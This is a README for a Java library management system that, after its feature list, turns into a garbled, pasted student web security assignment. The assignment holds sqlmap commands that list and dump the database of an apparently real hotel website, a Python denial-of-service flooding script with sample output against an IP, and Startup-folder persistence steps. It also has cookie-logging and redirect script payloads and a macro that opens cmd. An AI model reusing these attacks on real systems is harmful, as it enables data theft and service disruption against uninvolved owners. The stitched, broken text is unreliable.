
# Library Management System

## Overview

This project is a **Library Management System** developed in Java. It provides functionalities to manage books in a library, including adding, borrowing, returning, and viewing available books.

## Features

- **Add Books**: Add new books to the library collection.
- **Borrow Books**: Borrow books from the library and mark them as borrowed.
- **Return Books**: Return borrowed books to the library and make them available again.
- **View Available Books**: Get the count of books currently available in the library.

 - 18 Implement persistent mechanism using STARTUP folder 
● Alert hello world  
● And open calculator - - - - 
Code 1  
Vbscript for the alert box :  
Information --" . 
● open the notepad and write the script -> MsgBox "Hello World!" , vbInformation, 
"--     
● Then save as a file with ‘ alertBox.vbs ‘ . 
Script to open calculator :  
● open notepad and write the script ->start calc.exe . 
● Then save as a file with ‘ openCalc.bat ‘ . 
press ‘ Win + R ‘ (to open run) and then write ‘ shell:startup ’ and press Enter. 
Then these two file to that location and restart the pc and see the result .

 15 Implement Xpath injection using Xpath. - - - - - - - - 
Xpath tool is used to perform sql injection . for that we have repo : 
https://github.com/r0oth3x49/Xpath.git  
Go this site and there some steps like clone it and install necessary library which are 
listed in requirement.txt  
And used following commands so perform attack 
python xpath.py -u “http://www.site.com/vuln.php?id=1” --dbs


14 Implement sql injection using SQL map - 
Sqlmap : https://sqlmap.org/ now go to the download section and clone the github repo. - - 
After clone take the site where you want to perform attack here i use : 
https://www.hotelcitadelsurat.com/pages.php?id=1  
To list the databases use  - 
python sqlmap.py -u "https://www.hotelcitadelsurat.com/pages.php?id=1" --dbs 
(23) 
Solanki Jatin                   
Web Security Practical assignment                     
Roll no.: 40 - - 
After that we have command to dump the database of website  - 
python sqlmap.py -u "https://www.hotelcitadelsurat.com/pages.php?id=1" --dump 
"testing” 
After that go to your appdata folder and sqlmap folder where you can find your data. 


ist the cookies of any site and display it in the console. - 
To see cookies of site use this script : ‘ <script> console.log(document.cookie) </script> ’ 

Perform  Redirect to Another Page on Mouseover event. - - 
To  redirect to Another Page on Mouseover event use this script  : <img 
src='https://oyster.ignimgs.com/mediawiki/apis.ign.com/god-of-war
ragnarok/d/dc/Kratos.jpg 
' onmouseover="window.location='https://www.youtube.com/@GangstaPerspectives " 
alt='ben10' height='300px' /> 
Then click the button Now put mouse over that image and see result 



- 11 Create a macro document which opens command prompt while opening 
document. And try to execute some basic commands like IPCONFIG, windows version 
etc.

shell "cmd.exe",vbNormalFocus


- 10 Perform web enumeration like url to ip and employ python script to perform DOS 
attack. 
Script: 
pip install socket 
pip install random 
pip install time 
import socket 
import random 
import time 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
ip=input("enter ip") 
port=int(input("enter target port")) 
sleep =float(input("sleep")) 
s.connect((ip,port)) 
(15) 
Solanki Jatin                   
Web Security Practical assignment                     
Roll no.: 40 
for i in range(1, 100**1000): 
s.send(random._urandom(10) * 1000) 
print(f"Send : {i}", end='\r') 
time.sleep(sleep)   
Output is: 
enter ip 104.18.18.107 
enter target port 80 
sleep 1 
Send : 1


- 9 Create  a local python script to create a server and execute a remote script. 
python -m http.server 8000 
Open localhost:8000 port and show your directory items in python server




Perform live network scanning and identify services related to the internet. 
(12) 
Solanki Jatin                   
Web Security Practical assignment                     
Roll no.: 40 - - -  
For network scanning I use the tool nmap. By using nmap we can scan different 
networks or range of networks. 
First we take one site and then convert into an ip address for that we use domain 
converter tool ( https://whois.domaintools.com/ ) . 

nmap -sT port

Add a link to redirect any other web resources which locates any specific website 
or any web resource.  

< href = "https://www.youtube.com/results?search_query=macro+in+word+document+open+cmd">click here</a>


 Perform prompt programming to add any two numbers using prompt in vulnerable 
websites. 
let a = Window.prompt("a)"


- 5 Perform redirection using windows listeners.

- <script>  
window.location.href="https://www.youtube.com/@GangstaPerspectives" 
</script>


Q - 4 Load any external image from a remote server to a vulnerable website. 
 <img src=’img path’ alt=’alt’ >

 3 Print alert and find some plaintext in any vulnerable website. 
 <script>alert(‘alert message’)</script>


  2 Perform port scanning in any two vulnerable websites. - 
Port scanning tools are essential for identifying open ports and services running on a 
website or server . 
(2) 
Solanki Jatin                   
Web Security Practical assignment                     
Roll no.: 40 - - - 
Some tools are Nmap , Zenmap , Netcat .. also some website are also used for port 
scanning ex : https://portscanner.online/  
First enter the URl of this site and scan  
http://testphp.vulnweb.com/ :  - 
http://www.itsecgames.com/ :  



1 Analyze any two vulnerable websites with their certificates. - - - 
So to check certificates see at the URl bar click on the button beside the refresh button . 
Here are the two vulnerable sites . 
HTTP Forever :  - 
http://testphp.vulnweb.com/ :  

